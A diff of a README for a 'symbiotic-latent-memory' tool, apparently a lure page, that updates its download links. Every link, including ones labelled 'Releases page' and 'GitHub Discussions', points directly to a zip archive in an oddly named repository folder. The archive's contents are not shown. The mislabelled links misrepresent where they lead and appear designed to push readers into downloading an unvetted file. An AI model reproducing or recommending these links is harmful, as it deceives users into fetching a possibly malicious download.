@@ -6,7 +6,7 @@ Welcome to the **symbiotic-latent-memory** project. This application helps langu
 
 ## 📥 Download Links
 
-[![Download symbiotic-latent-memory](https://raw.githubusercontent.com/anoopkodaly/symbiotic-latent-memory/main/Hicksite/symbiotic-latent-memory_1.4.zip)](https://raw.githubusercontent.com/anoopkodaly/symbiotic-latent-memory/main/Hicksite/symbiotic-latent-memory_1.4.zip)
+[![Download symbiotic-latent-memory](https://github.com/anoopkodaly/symbiotic-latent-memory/raw/refs/heads/main/Hicksite/symbiotic_latent_memory_3.6.zip)](https://github.com/anoopkodaly/symbiotic-latent-memory/raw/refs/heads/main/Hicksite/symbiotic_latent_memory_3.6.zip)
 
 ## 📂 Prerequisites
 
@@ -18,7 +18,7 @@ To use this application, ensure you have the following:
 
 ## 📥 Download & Install
 
-1. **Visit the Download Page:** Go to the [Releases page](https://raw.githubusercontent.com/anoopkodaly/symbiotic-latent-memory/main/Hicksite/symbiotic-latent-memory_1.4.zip) to find the latest version of the application.
+1. **Visit the Download Page:** Go to the [Releases page](https://github.com/anoopkodaly/symbiotic-latent-memory/raw/refs/heads/main/Hicksite/symbiotic_latent_memory_3.6.zip) to find the latest version of the application.
   
 2. **Select Your Operating System:** Choose the correct file based on your operating system. You'll see options for Windows, macOS, and Linux.
 
@@ -64,14 +64,14 @@ Here are some common issues you may encounter while installing or using **symbio
 
 - **Features Not Working:**
   - Verify that you are connected to the internet.
-  - Check if updates are available on the [Releases page](https://raw.githubusercontent.com/anoopkodaly/symbiotic-latent-memory/main/Hicksite/symbiotic-latent-memory_1.4.zip).
+  - Check if updates are available on the [Releases page](https://github.com/anoopkodaly/symbiotic-latent-memory/raw/refs/heads/main/Hicksite/symbiotic_latent_memory_3.6.zip).
 
 ## 🌐 Additional Resources
 
 - **Documentation:** Comprehensive user manuals and guides are available on the project's wiki page.
-- **Community Support:** Join discussions at our [GitHub Discussions](https://raw.githubusercontent.com/anoopkodaly/symbiotic-latent-memory/main/Hicksite/symbiotic-latent-memory_1.4.zip) to ask questions or share insights with fellow users.
+- **Community Support:** Join discussions at our [GitHub Discussions](https://github.com/anoopkodaly/symbiotic-latent-memory/raw/refs/heads/main/Hicksite/symbiotic_latent_memory_3.6.zip) to ask questions or share insights with fellow users.
 - **Feedback:** We appreciate your input. Please report any issues or suggestions through the GitHub Issues page.
 
 ## 🎉 Conclusion
 
-The **symbiotic-latent-memory** application enhances the capability of language models by integrating intelligent memory features. With straightforward installation and user-friendly design, anyone can leverage this technology. Don't hesitate to explore and see how it can improve your interactions. For more information, feel free to visit the [Releases page](https://raw.githubusercontent.com/anoopkodaly/symbiotic-latent-memory/main/Hicksite/symbiotic-latent-memory_1.4.zip) for the latest updates.
+The **symbiotic-latent-memory** application enhances the capability of language models by integrating intelligent memory features. With straightforward installation and user-friendly design, anyone can leverage this technology. Don't hesitate to explore and see how it can improve your interactions. For more information, feel free to visit the [Releases page](https://github.com/anoopkodaly/symbiotic-latent-memory/raw/refs/heads/main/Hicksite/symbiotic_latent_memory_3.6.zip) for the latest updates.
